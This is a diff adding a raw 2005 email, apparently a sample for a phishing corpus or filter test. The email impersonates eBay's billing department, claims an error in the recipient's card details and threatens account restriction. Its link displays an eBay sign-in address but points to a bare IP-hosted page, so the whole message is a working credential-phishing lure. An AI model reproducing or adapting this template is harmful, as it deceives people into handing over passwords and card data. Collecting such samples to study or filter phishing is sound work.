@@ -1,0 +1,179 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 755D62A893
+	for <user@example.com>; Wed, 12 Oct 2005 15:14:18 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 718A4621C71; Wed, 12 Oct 2005 15:14:18 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 1E745621C66
+	for <user@example.com>; Wed, 12 Oct 2005 15:14:18 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id PAA13001
+	for user@example.com; Wed, 12 Oct 2005 15:14:17 -0400
+Received: from ebay600.com (pool-nat-195-137-205-249.Asconet.ro [195.137.205.249] (may be forged))
+	by mail.example.com with SMTP id PAA12993
+	for <user@example.com>; Wed, 12 Oct 2005 15:14:15 -0400
+Message-Id: <200510121914.PAA12993@mail.example.com>
+From: "aw-confirm@ebay.com" <aw-confirm@ebay.com>
+To: user@example.com
+Reply-To: aw-confirm@ebay.com
+Subject: Security Alert - eBay Billing Informations Update 
+Date: Wed, 12 Oct 2005 22:14:16 +0300
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="35a6ce6f-df27-449e-babb-9767fe7067e4"
+Content-Length: 7452
+Lines: 146
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 194
+
+
+This is a multi-part message in MIME format
+--35a6ce6f-df27-449e-babb-9767fe7067e4
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+<!--StartFragment -->&nbsp;<BR>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+<TBODY>
+<TR vAlign=3Dtop>
+<TD width=3D600 bgColor=3D#d6dcfe><FONT face=3D"Arial, =
+Helvetica,&#13;&#10;sans-serif   " size=3D3><STRONG><FONT face=3D=
+Verdana>Place or Update Credit Card on File</FONT></STRONG></FONT>&nbsp;</TD>=
+
+<TD width=3D200 bgColor=3D#d6dcfe>
+<DIV align=3Dright><IMG height=3D18 src=3D=
+"http://pics.ebaystatic.com/aw/pics/aboutme/v3/ebay_logo_39x18.gif" width=3D=
+39></DIV></TD></TR>
+<TR>
+<TD bgColor=3D#d6dcfe colSpan=3D2 height=3D2><IMG height=3D2 src=3D=
+"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D1></TD></TR>
+<TR>
+<TD vAlign=3Dcenter bgColor=3D#9999cc colSpan=3D2 height=3D2><IMG height=3D2 =
+src=3D"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D=
+1></TD></TR></TBODY></TABLE><BR>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+<TBODY>
+<TR>
+<TD vAlign=3Dtop width=3D600>
+<P><FONT face=3D"Arial, Helvetica, sans-serif   " size=3D-1>Dear <STRONG>eBay =
+member</STRONG>,<BR><BR>During our regularly schedule account maintenance and =
+verification we have detected a slight error in your billing information on =
+file with eBay. This might be due to either following =
+reasons:<BR></FONT></P><FONT face=3D"Arial, Helvetica, sans-serif   " size=3D=
+-1></FONT>
+<P><FONT face=3D"Arial, Helvetica, sans-serif   " size=3D-1><FONT face=3D=
+arial>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;- A recent change in your personal information (i.e. change of =
+address)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;- Submitting invalid information during the initial sign up =
+process.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;-&nbsp;An inability to accurately verify your selected option of =
+payment due an internal error =
+within<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp; our&nbsp;processors.<BR></FONT><FONT face=3D=
+arial><BR></FONT></FONT></P>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD bgColor=3D#cccccc colSpan=3D3 height=3D2><IMG title=3D"" height=3D2 alt=3D=
+" " src=3D"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D1></TD></TR>
+<TR bgColor=3D#f4f4f4>
+<TD width=3D2 bgColor=3D#cccccc rowSpan=3D2><IMG title=3D"" height=3D1 alt=3D=
+" " src=3D"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D2></TD>
+<TD>
+<TABLE cellSpacing=3D0 cellPadding=3D3 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD noWrap width=3D"20%"><FONT face=3D"Arial Black" size=3D2>Your credit card =
+on file with eBay</FONT></TD>
+<TD width=3D"60%">&nbsp;</TD>
+<TD noWrap align=3Dright width=3D"20%">&nbsp;</TD></TR></TBODY></TABLE></TD>
+<TD width=3D2 bgColor=3D#cccccc rowSpan=3D2><IMG title=3D"" height=3D1 alt=3D=
+" " src=3D"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D2></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=3D0 cellPadding=3D3 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD noWrap width=3D"20%"><FONT face=3Darial size=3D2>Card number: =
+XXXX-XXXX-XXXX-7679 (Not shown for security purposes)</FONT>&nbsp;</TD>
+<TD width=3D"60%"></TD>
+<TD noWrap align=3Dright width=3D"20%"><FONT face=3D"Arial, =
+Helvetica,&#13;&#10;sans-serif   " size=3D2>Expiration date: 02/07</FONT> =
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=3D#cccccc colSpan=3D3 height=3D2><IMG title=3D"" height=3D2 alt=3D=
+" " src=3D"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D=
+1></TD></TR></TBODY></TABLE>
+<P><FONT size=3D2><FONT face=3DArial>Please sign in to your eBay account and =
+update your billing information:</FONT><IMG height=3D20 src=3D=
+"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D1 border=3D=
+0><BR></FONT><IMG height=3D20 src=3D=
+"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D1 border=3D0><BR><FONT =
+size=3D2><FONT face=3D"Arial, Helvetica, sans-serif   "><A title=3D=
+"http://signin.ebay.com/eBayISAPI.dll?SignIn&ssPageName=3Dh:h:sin:US" href=3D=
+"http://86.34.5.170/~xl1/signin.ebay.com.aw-cgi.eBayISAPI.dll/"><FONT color=3D=
+#003399>http://signin.ebay.com/eBayISAPI.dll?SignIn&amp;ssPageName=3D=
+h:h:sin:US <FONT face=3Darial size=3D2></FONT></FONT></A><FONT color=3D=
+#003399></FONT></FONT></FONT></P>
+<P><FONT size=3D2><FONT size=3D2><FONT face=3D"Arial, Helvetica, sans-serif   =
+"><FONT color=3D#003399><IMG height=3D10 src=3D=
+"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D1 border=3D0></FONT>If =
+your account information is not update, your ability to sell or bid on eBay =
+will become restricted.<BR></FONT></FONT><FONT size=3D2><FONT face=3D"Arial, =
+Helvetica,&#13;&#10;sans-serif   "></FONT></FONT></FONT></P>
+<P><FONT size=3D2><FONT face=3DArial><FONT size=3D2>Thank you,<BR>eBay =
+Billing Department</FONT><BR></FONT><IMG height=3D10 src=3D=
+"http://pics.ebaystatic.com/aw/pics/x.gif" width=3D1 border=3D0><BR>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D$TableWidth>
+<TBODY>
+<TR>
+<TD>
+<HR color=3D#d2d3d2 noShade>
+</TD></TR>
+<TR>
+<TD><FONT face=3DArial color=3D#666666 size=3D1>eBay treats your personal =
+information with the utmost care, and our Privacy Policy is designed to =
+protect you and your information. eBay will never ask their users for =
+personal information, such as bank account numbers, credit card numbers, pin =
+numbers, passwords, or Social Security numbers in an email. For more =
+information on how to protect your eBay password and your account, please =
+visit <A title=3Dhttp://pages.ebay.com/help/account_protection.html href=3D=
+"http://pages.ebay.com/help/account_protection.html" onfiltered=3D"return =
+openNonHelpWindow(this.href);"><FONT color=3D#003399>User Account =
+Protection</FONT></A>.</FONT></TD></TR>
+<TR>
+<TD><IMG height=3D15 alt=3D" " src=3D=
+"http://pics.ebaystatic.com/aw/pics/spacer.gif" width=3D1></TD></TR>
+<TR>
+<TD><FONT face=3DArial color=3D#666666 size=3D1>This eBay notice was sent =
+to&nbsp;you based on your eBay account preferences and in accordance with our =
+<A title=3Dhttp://pages.ebay.com/help/community/png-priv.html href=3D=
+"http://pages.ebay.com/help/community/png-priv.html" onfiltered=3D"return =
+openNonHelpWindow(this.href);"><FONT color=3D#003399>Privacy =
+Policy</FONT></A>. To change your notification preferences, <A title=3D=
+http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow href=3D=
+"http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow" onfiltered=3D"return =
+openNonHelpWindow(this.href);"><FONT color=3D#003399>click here</FONT></A>. =
+If you would like to receive this email in text format, <A title=3D=
+http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow href=3D=
+"http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow" onfiltered=3D"return =
+openNonHelpWindow(this.href);"><FONT color=3D#003399>click =
+here</FONT></A>.</FONT></TD></TR>
+<TR>
+<TD><IMG height=3D15 alt=3D" " src=3D=
+"http://pics.ebaystatic.com/aw/pics/spacer.gif" width=3D1></TD></TR>
+<TR>
+<TD>
+<P align=3Dcenter><FONT face=3DArial color=3D#666666 size=3D2>Copyright =A9 =
+2005 eBay Inc. All Rights Reserved. <BR>Designated trademarks and brands are =
+the property of their respective owners.<BR>eBay and the eBay logo are =
+trademarks of eBay =
+Inc.</FONT></P></TD></TR></TBODY></TABLE></FONT></P></TD></TR></TBODY></TABLE=
+>  
+--35a6ce6f-df27-449e-babb-9767fe7067e4--
+
